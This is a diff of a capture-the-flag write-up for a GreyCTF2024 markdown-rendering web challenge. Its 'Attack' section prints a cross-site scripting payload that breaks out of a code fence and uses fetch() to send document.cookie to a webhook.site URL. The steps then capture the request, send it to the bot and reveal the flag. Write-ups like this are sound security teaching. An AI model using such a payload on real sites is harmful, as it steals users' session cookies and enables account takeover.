@@ -168,12 +168,17 @@ if (line.startsWith('```')) {
 
 # Attack
 - First, I have to make a POC. This is my payload:
-```
-```"><script>fetch("https://webhook.site/your-id-here/?cookie="+document.cookie)</script><"```
-```
+  ```
+  ```"><script>fetch("https://webhook.site/your-id-here/?cookie="+document.cookie)</script><"
+  \``` (please remove '\')
+  ```
 
-- I also add a cookie for test:
+  ![image](https://github.com/NoSpaceAvailable/GreyCTF2024/assets/143888307/006ca291-d6de-42d3-b140-5a4184f1bf4e)
 
-  
+- Submit and go to webhook. The request has been captured:
+
+  ![image](https://github.com/NoSpaceAvailable/GreyCTF2024/assets/143888307/966d9d0a-3331-42c5-aaa9-544494ea2792)
+
+- Send it to the bot and get the flag.
 
 - Flag: grey{m4rkd0wn_th1s_fl4g}
